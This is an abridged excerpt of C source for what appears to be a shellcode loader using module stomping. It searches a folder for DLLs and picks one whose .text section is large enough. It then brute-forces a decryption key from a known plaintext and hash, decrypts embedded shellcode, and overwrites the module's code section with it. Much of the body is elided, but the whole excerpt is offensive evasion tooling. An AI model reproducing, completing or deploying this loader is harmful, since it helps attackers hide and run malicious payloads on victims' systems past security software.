...
Shellcode.h should have the following defined:
unsigned char Shellcode[] = { ... };
unsigned long SHELLCODE_SIZE = sizeof(Shellcode);
const unsigned int targetHash = 3814069492;
const char known[] = { ... };
...
LPVOID ModuleAlloc(
    ...
    for ( SIZE_T i = 0; i < ModuleCount; i++ ) {
        ...
        PRINT_OK( "[%s] Section Header => %p", ModuleName[i], MmSectionHdr );

        TxtSize = MmSectionHdr->Misc.VirtualSize;
        PRINT_OK( "[%s] .text Size => %d", ModuleName[i], TxtSize );
        PRINT_OK( "[%s] Required Size (shellcode) => %d", ModuleName[i], Size );
        if ( TxtSize < Size ) {
            /**
             * abort and move on to the next module
             */
            PRINT_ERR( "[%s] .text section is too small, abort", ModuleName[i] );
            if ( Base ) {
        ...
        PRINT_OK( "[%s] found suitable .text section (0x%p) of size %d", ModuleName[i], TxtAddr, TxtSize );
        break;
    }
...
BOOL FindModules(
    ...
    *Count                = 0;
    ...
    PRINT_OK( "searching for stompable modules in %s", Path );
    ...
    FindClose( hFind );
    PRINT_OK( "found %d modules", *Count );
    return TRUE;
};
...
INT main( int argc, char ** argv ) {
    ...
    PRINT( "bruteforcing key given known: %s, size: %d, targetHash: %d", known, size_to_brute, targetHash );
    if ( ( ascii_key = Jess( known, sizeof( known ), size_to_brute, targetHash ) ) == NULL ) {
        PRINT_ERR( "Jess failed" );
        return 1;
    }
    PRINT_OK( "key found: %s => %s", known, ascii_key );
    ...
    PRINT( "decrypting shellcode @ %p with key %s", Shellcode, key );
    ...
    PRINT( "stomping %d bytes of shellcode @ %p", SHELLCODE_SIZE, TxtAddr );
